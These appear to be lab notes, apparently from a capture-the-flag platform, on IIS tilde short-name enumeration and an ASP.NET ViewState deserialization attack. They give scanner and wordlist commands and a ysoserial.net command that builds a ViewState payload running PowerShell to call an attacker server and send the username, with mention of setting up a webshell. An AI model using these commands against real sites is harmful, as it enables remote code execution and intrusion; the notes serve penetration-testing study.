    IIS Tilde Enumeration

      IIS tilde directory enumeration is a technique utilised to uncover hidden files, directories, and short file names (aka the 8.3 format). The explanation of this format can be found here

      We can identify files based using the follwing script

      java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/

      This script will be bruteforcing the filename using a,b,c,d... and so on. This way in case it finds a coincidence it will try again using aa,ab,ac,ad... The script outout shows

      |_ Number of sent requests: 553
|_ Identified directories: 2
   |_ ASPNET~1
    |_ UPLOAD~1
  |_ Identified files: 3
    |_ CSASPX~1.CS
      |_ Actual extension = .CS
    |_ CSASPX~1.CS??
    |_ TRANSF~1.ASP

      As we can see the script identifyed three files and two directories but it does not give us the all the filename. We can try by just simply using TRANSF~1.ASP but in case it does not work we'll have to create a wordlist. To do so we can use the following command

      This command will go over all files located at /usr/share/wordlist and will only select the words that start with transf creating a wordlist located at /tmp

      egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt

      Now use this wordlist combinaed with dirb or feroxbuster to reveal the file if the name matches

Exploitation

    ASP.NET ViewState Deserialization Attack

      First of all let's understand what this is about. Web Forms are a component of the ASP.NET web application framework. This thing is a bit old but there are many websites which uses web forms still

      This component uses a function called VIEWSTATE which is used to store the current state of the website. Example:In case you have a website with the typical ShoppingCart in case you have some items inside this ShoppingCart the VIEWSTATE will store this information in a field called __VIEWSTATE This information will stayed serialized and then passed from the client to the server. Once the server get's it, it will be deserialized and the clean data will be processsed

      In order to exploit this we will need to have access to web.config which contains the keys. Here is a code snip of the file

      <machineKey 
    validationKey="YourSecretKeyHere" 
    decryptionKey="YourDecryptionKeyHere" 
    validation="HMACSHA256" 
    decryption="AES" />

      Here we can see some important parameters

      • validationKey: Used to create and verify the MAC (Message Authentication Code)
      • decryptionKey: Used to encrypt/decrypt the ViewState data
      • validation: Hashing algorithm (SHA1, HMACSHA256, HMACSHA512)
      • decryption: Encryption algorithm (AES, 3DES)

      Now that we have a clear view of the different components we will describe the musts to exploit this

      • Known or Weak Machine Key
      • Disabled or Bypassed MAC Validation
      • Presence of Deserialization Gadget Chains

      Once we identifyed the request where we could be able to inject our payload we will begin generating the payload itself. To do so we will use a tool called ysoserial.net

      Here are few commands which could serve as help using ysoserial.net

      First of all we need to setup the plugin. We can use the following command to list the available plugins. For our case we need ViewState

      .\ysoserial.exe -p help

      Now that we have clear the plugin. We can use the following commands to list examples of how to use it

      .\ysoserial.exe -p viewstate --examples

      This will list different examples. Have in mind that there is a parameter (-g) which is the the gadget chain. In case using any gadget does not work we can try anotherone and pray

      Here goes an exaple of command to exploit it where we will perform a webrequest to our attacker server but we could use any powershell command in order to stablish a webshell

      .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell.exe Invoke-WebRequest -Uri http://10.10.14.91:8000/$env:UserName" --decryptionalg="AES"  --path="/portfolio" --decryptionkey="74477CEBDD09D66A4D4A8C8..." --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869..."

      Once executed ysoserial will provide the payload in order to inject in the __VIEWSTATE parameter of the post request. Then send the request and stablish the webshell or execute the command
